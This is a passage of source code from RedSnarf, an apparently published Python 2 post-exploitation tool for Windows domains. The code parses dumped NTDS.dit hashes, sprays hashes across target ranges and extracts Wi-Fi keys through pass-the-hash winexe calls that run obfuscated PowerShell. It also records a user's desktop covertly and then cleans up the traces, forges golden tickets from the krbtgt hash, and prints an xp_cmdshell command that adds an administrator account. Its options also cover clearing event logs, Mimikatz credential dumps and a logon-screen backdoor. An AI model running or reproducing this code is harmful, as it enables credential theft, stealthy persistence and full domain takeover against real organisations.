				#[*] Using the DRSUAPI method to get NTDS.DIT secrets
				for x in xrange(1,len(hash_list)):
					if hash_list[x]=='[*] Using the DRSUAPI method to get NTDS.DIT secrets':
						hl_st=x
						break
					else:
						hl_st=0
				
				for y in xrange(hl_st,len(hash_list)):
					
					pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(hash_list[y])
					
					if pwdump:
						splitter = hash_list[y].split(":")
						username=splitter[0]
						
						#Remove machine accounts
						if username.find('$')==-1:
							lm=splitter[2]
							
							if lm=='aad3b435b51404eeaad3b435b51404ee':
								lst_nthash.append(hash_list[y]+'\n');
								lst_ntuser.append(username+'\n');
							else:
								lst_lmhash.append(hash_list[y]+'\n');
								lst_lmuser.append(username+'\n');
								
				lst_nthash=list(set(lst_nthash))
				fout=open(hashfolder+'/nt.txt','w')
				for h in lst_nthash:
					fout.write(h)
				fout.close()

				lst_ntuser=list(set(lst_ntuser))
				fout=open(hashfolder+'/nt_usernames.txt','w')
				for u in lst_ntuser:
					fout.write(u)
				fout.close()

				lst_lmhash=list(set(lst_lmhash))
				fout=open(hashfolder+'/lm.txt','w')
				for h in lst_lmhash:
					fout.write(h)
				fout.close()

				lst_lmuser=list(set(lst_lmuser))
				fout=open(hashfolder+'/lm_usernames.txt','w')
				for u in lst_lmuser:
					fout.write(u)
				fout.close()

		if os.path.isfile(hashfolder+'/nt.txt'):
			with open(hashfolder+'/nt.txt') as f:
				print colored('[+]'+str(sum(1 for _ in f))+' NT hashes written to '+hashfolder+'/nt.txt\n','green') 

		if os.path.isfile(hashfolder+'/nt_usernames.txt'):
			with open(hashfolder+'/nt_usernames.txt') as f:
				print colored('[+]'+str(sum(1 for _ in f))+' NT usernames written to '+hashfolder+'/nt_usernames.txt\n','green') 

		if os.path.isfile(hashfolder+'/lm.txt'):
			with open(hashfolder+'/lm.txt') as f:
				print colored('[+]'+str(sum(1 for _ in f))+' LM hashes written to '+hashfolder+'/lm.txt\n','red') 

		if os.path.isfile(hashfolder+'/lm_usernames.txt'):
			with open(hashfolder+'/lm_usernames.txt') as f:
				print colored('[+]'+str(sum(1 for _ in f))+' LM usernames written to '+hashfolder+'/lm_usernames.txt\n','red') 

def userstatus(targetpath,dcip,inputfile):
	e=''

	try:
		conn = ldap.initialize('ldap://' + dcip) 
		conn.protocol_version = 3
		conn.set_option(ldap.OPT_REFERRALS, 0)
		conn.simple_bind_s(user+'@'+domain_name, passw) 
	except ldap.LDAPError, e: 
		if 'desc' in e.message:
			print colored("[-]LDAP error: %s" % e.message['desc'],'red')
			sys.exit()
	else: 
		print e
  
	domain = domain_name
	
	splitter = domain.split(".")
	base=''
	for part in splitter:
		base = base + "dc=" + part + ","
   
	if os.path.isfile(targetpath+str(dcip)+'/'+inputfile):
		with open(targetpath+str(dcip)+'/'+inputfile,'r') as inifile:
			data=inifile.read()
			lm_usernames_list=data.splitlines()
			for lmnames in lm_usernames_list:
				
				if lmnames.find(domain_name)!=-1:
					mark=str(lmnames[(len(domain_name)+1):len(lmnames)])
				else:
					mark=lmnames
								
				criteria = "(&(objectClass=User)(sAMAccountName="+mark+"))"
				attributes = ['userAccountControl', 'sAMAccountName']

				results =conn.search_s(str(base[:-1]), ldap.SCOPE_SUBTREE, criteria, attributes) 
				da_list=[]
   
				for result in results:
					result_dn = result[0]
					result_attrs = result[1]
            
					if mark!='': 
						if "sAMAccountName" in result_attrs:
							for Account in result_attrs["sAMAccountName"]:
								UserName = str(result_attrs["sAMAccountName"])
								AccStatus = str(result_attrs["userAccountControl"])
					
								if UserName[2:-2]==mark:
									if str(AccStatus[2:-2]) != "514" and str(AccStatus[2:-2]) != "532480" and str(AccStatus[2:-2]) != "4096" and str(AccStatus[2:-2]) != "66050" and str(AccStatus[2:-2]) != "546" and str(AccStatus[2:-2]) != "66082" and str(AccStatus[2:-2]) != "262658" and str(AccStatus[2:-2]) != "262690" and str(AccStatus[2:-2]) != "328194" and str(AccStatus[2:-2]) != "328226":
										fout=open(targetpath+str(dcip)+'/'+'enabled_'+inputfile,'a')
										fout.write(mark+'\n')
										fout.close()
									else:
										fout=open(targetpath+str(dcip)+'/'+'disabled_'+inputfile,'a')
										fout.write(mark+'\n')
										fout.close()
			

	if os.path.isfile(targetpath+str(dcip)+'/'+'enabled_'+inputfile):
		with open(targetpath+str(dcip)+'/'+'enabled_'+inputfile) as f:
			print colored("[+]"+str(sum(1 for _ in f))+" enabled accounts written to "+targetpath+str(dcip)+'/'+'enabled_'+inputfile,'green')

	if os.path.isfile(targetpath+str(dcip)+'/'+'disabled_'+inputfile):
		with open(targetpath+str(dcip)+'/'+'disabled_'+inputfile) as f:
			print colored("[+]"+str(sum(1 for _ in f))+" disabled accounts written to "+targetpath+str(dcip)+'/'+'disabled_'+inputfile,'green')

def main():
	if credsfile!='':
		print colored('\n[+]Getting ready to spray some hashes...','yellow') 
		if os.path.isfile(credsfile):
			with open(credsfile,'r') as inifile:
				data=inifile.read()
				hash_list=data.splitlines()
				for tmphash in hash_list:
					tmphash = tmphash.replace('NO PASSWORD*********************', '00000000000000000000000000000000')
					pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(tmphash)
					plaintextpassmatch = re.compile('^(\S+?)\s+(\S*?)$')
					plain = plaintextpassmatch.match(tmphash)
					usertextpassmatch = re.compile('^(\S+?)$')
					username = usertextpassmatch.match(tmphash)
					wcematch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
					wce = wcematch.match(tmphash)
					if pwdump:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							args.username=splitter[0]
							args.password=splitter[2]+':'+splitter[3]+':::'
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-]Credentials Error",'red')
								logging.error("[-]Credentials Error")
					if wce:
						try:
							userhash = tmphash
							splitter = userhash.split(":")
							args.username=splitter[0]
							args.password=splitter[2]
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-]Credentials Error",'red')
								logging.error("[-]Credentials Error")
					if plain:
						try:
							userhash = tmphash
							splitter = userhash.split(" ")

							if len(splitter)==2:
								args.username=splitter[0]
								args.password=splitter[1]
							
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
								print colored("[-]Credentials Error",'red')
								logging.error("[-]Credentials Error")
					if username:
						try:
							userhash = tmphash
							splitter = userhash.split(" ")
							
							if len(splitter)==1:
								args.username=splitter[0]
								
								args.password=args.pass_on_blank
							
							print colored('\n[+]Spraying...','yellow') 
							run()
						except:
							print colored("[-]Credentials Error",'red')
							logging.error("[-]Credentials Error")
	else:
		run()
	if len(targets)>1 and args.quick_validate in noanswers:
		print colored ('\n[+]Range Detected - Now trying to merge pwdump files to '+mergepf,'yellow')

		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/pwdump'):
				print colored ('[+]Got a pwdump file for '+str(ip),'blue')
				fin=open(outputpath+str(ip)+'/pwdump','r')
				data2=fin.read()
				fin.close()
				fout=open('/tmp/tmpmerge.txt','a')
				fout.write(data2)
				fout.close() 
				print colored ('[+] Merged '+str(ip) + ' successfully','green')
			
		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('cat /tmp/tmpmerge.txt | sort | uniq > '+mergepf)
		if os.path.isfile('/tmp/tmpmerge.txt'):
			os.system('rm /tmp/tmpmerge.txt')
		print colored ('\n[+]Check out '+mergepf+' for unique, sorted, merged hash list','yellow')

	if find_user !='n':
		print colored ('\n[+]Now looking for where user '+find_user+' is logged in','yellow')
		for ip in targets:
			if os.path.isfile(outputpath+str(ip)+'/logged_on_users.txt'):
				
				if find_user in open(outputpath+str(ip)+'/logged_on_users.txt').read():
					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')

banner()
p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.3f", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
# Creds
p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
p.add_argument("-p", "--password", dest="password", default="Password1", help="Enter a password or hash")
p.add_argument("-d", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
# Configurational 
p.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n", help="<Optional> Quickly Validate Credentials")
p.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
p.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
p.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
# Utilities
p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
p.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
p.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
p.add_argument("-uW", "--wifi_credentials", dest="wifi_credentials", default="n", help="<Optional> Grab Wifi Credentials")
# Hash related
p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Optional> Extract NTDS.dit using NTDSUtil")
p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
p.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
p.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
p.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
p.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
# Enumeration related
p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
p.add_argument("-eD", "--user_desc", dest="user_desc", default="n", help="<Optional> Save AD User Description Field to file, check for password")
p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
p.add_argument("-eO", "--ofind_user", dest="ofind_user", default="n", help="<Optional> Find user - Offline")
p.add_argument("-eP", "--password_policy", dest="password_policy", default="n", help="<Optional> Display Password Policy")
p.add_argument('--protocols', nargs='*', help=str(SAMRDump.KNOWN_PROTOCOLS.keys()))
p.add_argument("-eR", "--recorddesktop", dest="recorddesktop", default="n", help="<Optional> Record a desktop using Windows Problem Steps Recorder")
p.add_argument("-eS", "--screenshot", dest="screenshot", default="n", help="<Optional> Take a screenshot of remote machine desktop")
p.add_argument("-eT", "--system_tasklist", dest="system_tasklist", default="n", help="<Optional> Display NT AUTHORITY\SYSTEM Tasklist")
# Registry related
p.add_argument("-rL", "--lat", dest="lat", default="n", help="<Optional> Write batch file for turning on/off Local Account Token Filter Policy")
p.add_argument("-rR", "--edq_rdp", dest="edq_rdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP Status")
p.add_argument("-rN", "--edq_nla", dest="edq_nla", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery NLA Status")
p.add_argument("-rT", "--edq_trdp", dest="edq_trdp", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Tunnel RDP out of port 443")
p.add_argument("-rW", "--edq_wdigest", dest="edq_wdigest", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Wdigest UseLogonCredential Registry Setting")
p.add_argument("-rB", "--edq_backdoor", dest="edq_backdoor", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Backdoor Registry Setting - Left Alt + Left Shift + Print Screen at Logon Screen")
p.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery UAC Registry Setting")
p.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
p.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
p.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
p.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")

args = p.parse_args()

user = args.username
passw = args.password
files = ['sam', 'system', 'security']
progs = ['cachedump','lsadump']

password_policy=args.password_policy
creddump7path=args.credpath
outputpath=args.outputpath
mergepf=args.mergepf
credsfile=args.credsfile
skiplsacache=args.skiplsacache
dropshell=args.dropshell
lsass_dump=args.lsass_dump
policiesscripts_dump=args.policiesscripts_dump
domain_name=args.domain_name
c_password=args.c_password
ntds_util=args.ntds_util
drsuapi=args.drsuapi
massmimi_dump=args.massmimi_dump
service_accounts=args.service_accounts
find_user=args.find_user
ofind_user=args.ofind_user
clear_event=args.clear_event
lat=args.lat
xcommand=args.xcommand
edq_rdp=args.edq_rdp
edq_nla=args.edq_nla
edq_trdp=args.edq_trdp
edq_wdigest=args.edq_wdigest
edq_backdoor=args.edq_backdoor
qldap=args.qldap
edq_uac=args.edq_uac
edq_scforceoption=args.edq_scforceoption
stealth_mimi=args.stealth_mimi
mimikittenz=args.mimikittenz
golden_ticket=args.golden_ticket
edq_autologon=args.edq_autologon
edq_allowtgtsessionkey=args.edq_allowtgtsessionkey
system_tasklist=args.system_tasklist
multi_rdp=args.multi_rdp
edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
screenshot=args.screenshot
unattend=args.unattend
user_desc=args.user_desc
recorddesktop=args.recorddesktop
empire_launcher=args.empire_launcher
mssqlshell=args.mssqlshell
wifi_credentials=args.wifi_credentials

if lat in yesanswers:
	WriteLAT()
	sys.exit()

if c_password!='':
	try:
		banner()
		print colored("[+]Attempting to decrypt cpassword:",'yellow')
		gppdecrypt(c_password)
		sys.exit()
	except:
		sys.exit()

targets=[]
remotetargets = args.host

if remotetargets==None:
	print colored ('[-]You have not entered a target!, Try --help for a list of parameters','red')
	sys.exit()

if remotetargets[0:5]=='file=':
	
	if not os.path.isfile(remotetargets[5:len(remotetargets)]):
		print colored("[-]No "+remotetargets[5:len(remotetargets)],'red')
		exit(1)	
	else:
		fo=open(remotetargets[5:len(remotetargets)],"rw+")
		line = fo.readlines()
		fo.close()
	
		for newline in line:
			newline=newline.strip('\n')
			targets.append (newline);

elif remotetargets[0:3]=='ip=':
	
	targets.append (remotetargets[3:len(remotetargets)]);
	
elif remotetargets[0:6]=='range=':
		
	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
		targets.append (remotetarget);

if wifi_credentials in yesanswers:
	if len(targets)==1:
		try:
			#Get Wifi Passwords And Network Names
			print colored("[+]Retrieve Wifi Password",'yellow')
						
			line="netsh wlan show profiles"

			en = b64encode(line.encode('UTF-16LE'))						
						
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			print stdout_value

			if "There is no wireless interface on the system." in stdout_value:
				sys.exit()

			response = raw_input("\nEnter the name of Wifi Profile : ")
			line="netsh wlan show profile name=\""+response+"\" key=clear"

			en = b64encode(line.encode('UTF-16LE'))						
						
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			print stdout_value

			sys.exit()
			
		except OSError:
			print colored("[-]Something went wrong getting Wifi Details",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()


if mssqlshell=="WIN" or mssqlshell=="DB":
	if len(targets)==1:
		try:			
			#Check to see whether the supplied password is a hash or not
			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)
			
			if pwdump:
				passw=passw[0:-3]

			print colored("[+]Starting Impacket MSSQL Shell\n",'green')
			print colored("[+]Info - To manually turn on xp_cmdshell use",'green')
			print colored("[+]exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;",'blue')
			print colored("[+]exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n",'blue')

			print colored("[+]Info - To add a new user",'green')
			print colored("[+]xp_cmdshell 'net user redsnarf P@ssw0rd1 /add && net localgroup administrators redsnarf /add' ",'blue')

			if mssqlshell=="WIN":
				if pwdump:
					#proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
					os.system("mssqlclient.py -hashes "+passw+' '+domain_name+"/"+user+"@"+targets[0]+" -windows-auth ")
				else:
					os.system("mssqlclient.py "+domain_name+"/"+user+":"+passw+"@"+targets[0]+" -windows-auth ")

			else:
				os.system("mssqlclient.py "+user+":"+passw+"@"+targets[0])
			
			sys.exit()
			
		except OSError:
			print colored("[-]Something went wrong starting SQL Shell",'red')
			logging.error("[-]Something went wrong starting SQL Shell")
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()


if recorddesktop in yesanswers:
	if len(targets)==1:
		try:			
			print colored("[+]Starting Screen Recording:\n",'green')
			
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")

			usr_response = raw_input("\nPlease enter the username whose desktop you wish to record : ")
			if usr_response !="":

				fout=open('/tmp/srecordstart.bat','w')
				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecord" /TR "psr.exe /start /gui 0 /output C:\\windows\\temp\\OUTPUT.zip" /ST 23:36 /f\n')
				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecord" \n')
				fout.close() 
					
				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstart.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstart.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]
				
			response = raw_input("\nEnter Y to stop recording : ")
			if response in yesanswers:

				fout=open('/tmp/srecordstop.bat','w')
				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_ScreenRecordStop" /TR "psr.exe /stop" /ST 23:36 /f\n')
				fout.write('SchTasks /run /TN "RedSnarf_ScreenRecordStop" \n')
				fout.close() 
					
				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordstop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordstop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]


				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get OUTPUT.zip"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]
					
				if os.path.isfile(outputpath+targets[0]+"/"+"OUTPUT.zip"):
					print colored("[+]Recording file saved as "+outputpath+targets[0]+"/"+"OUTPUT.zip",'yellow')
					print colored("[+]To view generated .mht file in Kali use Mozilla Achieve Format Addon:\n",'green')
				else:
					print colored("[-]Recording not found, try again..",'red')

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\windows\\temp\\"+"OUTPUT.zip\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordstart.bat c:\\srecordstop.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]
			
				time.sleep(4)

				fout=open('/tmp/srecordtidyup.bat','w')
				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecord" /f\n')
				fout.write('SchTasks /delete /TN "RedSnarf_ScreenRecordStop" /f')
				fout.close() 

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put srecordtidyup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\srecordtidyup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]					
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\srecordtidyup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
				print proc.communicate()[0]

				time.sleep(4)

			sys.exit()
			
		except OSError:
			print colored("[-]Something went wrong recording the desktop",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if golden_ticket in yesanswers:
	if len(targets)==1:
		try:
			#Check to see whether the supplied password is a hash or not
			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
			pwdump = pwdumpmatch.match(passw)
			
			if pwdump:
				passw=passw[0:-3]
			
			if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
				print colored("[+]Found file - completed : "+outputpath+targets[0]+"/nt.txt",'green')
				print colored("[+]Taking krbtgt hash from pre parsed hashes",'yellow')
				if 'krbtgt' in open(outputpath+targets[0]+"/nt.txt").read():
					
					with open(outputpath+targets[0]+"/nt.txt",'r') as inifile:
						data=inifile.read()
						hash_list=data.splitlines()
						for k in hash_list:
							if k[0:6]=='krbtgt':
								khash=k
								
								kNTHASH=khash.split(':')[3] #NT Hash
								print colored("[+]krbtgt NTLM Hash",'green')
								print colored(kNTHASH,'yellow')
								break					
			else:
				print colored("[+]Pre parsed hashes not found : "+outputpath+targets[0]+"/nt.txt",'green')
				print colored("[+]Connecting to DC to get krbtgt hash : ",'yellow')
				
				if pwdump:
					proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
				else:
					proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
							

				stdout_value = proc.communicate()[0]
				krbtgt_data=stdout_value.splitlines()
				for hash_line in krbtgt_data:
					if hash_line[0:6]=='krbtgt':
						khash=hash_line
						kNTHASH=khash.split(':')[3] #NT Hash
						print colored("[+]krbtgt NTLM Hash",'green')
						print colored(kNTHASH,'yellow')
						break					
			
			if len(kNTHASH)>0:
				#Get the SID Information
				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)

				stdout_value = proc.communicate()[0]
					
				if not "krbtgt" in stdout_value:
					print colored("[+]krbtgt SID NOT FOUND...",'red')
					sys.exit()
						
				else:
					sid=stdout_value.split(' ')[1]
					kSID=sid[:-len(khash.split(':')[1])-1]

					print colored("[+]krbtgt SID",'green')
					print colored(kSID,'yellow')
											
					proc = subprocess.Popen("ticketer.py -nthash "+kNTHASH + " -domain-sid "+kSID+" -domain "+domain_name+ " -dc-ip "+ targets[0]+" administrator", stdout=subprocess.PIPE,shell=True)
					stdout_value = proc.communicate()[0]
					
					if "Saving ticket" in stdout_value:
						
						if not os.path.isdir(outputpath+targets[0]):
							proc = subprocess.Popen("mkdir "+outputpath+targets[0], stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

						if os.path.isdir(outputpath+targets[0]):
							proc = subprocess.Popen("cp ./administrator.ccache "+outputpath+targets[0]+"/administrator.ccache", stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

							proc = subprocess.Popen("rm ./administrator.ccache ", stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

						if os.path.isfile(outputpath+targets[0]+"/administrator.ccache"):
							print colored("[+]Ticket Created "+outputpath+targets[0]+"/administrator.ccache",'green')
							print colored("[+]To export - export KRB5CCNAME='"+outputpath+targets[0]+"/administrator.ccache'",'yellow')

					else:
						print colored("[-]Something Went Wrong Creating Golden-Ticket...",'red')

			sys.exit()
		except OSError:
			print colored("[-]Something went wrong creating Golden-Ticket",'red')		
			sys.exit()

if password_policy in yesanswers:
	if len(targets)==1:
		try:			
			if args.protocols:
				dumper = SAMRDump(args.protocols, args.username, args.password)
			else:
				dumper = SAMRDump(username=args.username, password=args.password)

			print colored("[+]Retrieving password policy",'green')
			dumper.dump(targets[0])
			print '\n\n'

			sys.exit()
			
		except OSError:
			print colored("[-]Something went wrong checking the password policy",'red')
	else:
		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
		sys.exit()

if edq_scforceoption!='n':
	if len(targets)==1:
		try:
			if edq_scforceoption=='e':
				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')

				print colored("[+]Enabling SCforceoption:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				print colored("[+]Querying the status of SCforceoption:",'green')
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print proc.communicate()[0]

				#Check to see if it's a DC
				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
				if "open" in scanv:
					print colored("[+]This looks to be a Domain Controller:",'green')
					print colored("[+]Warning - This will change the users current password:",'red')
					response = raw_input("Would you like to turn on SmartCardLogonRequired AD Setting for an account : Y/(N) ")
					if response in yesanswers:	
						response = raw_input("Please enter the account name :")
						print colored("[+]Turning on SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue')	
						line="Import-Module ActiveDirectory\n"
						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"
					
						en = b64encode(line.encode('UTF-16LE'))						
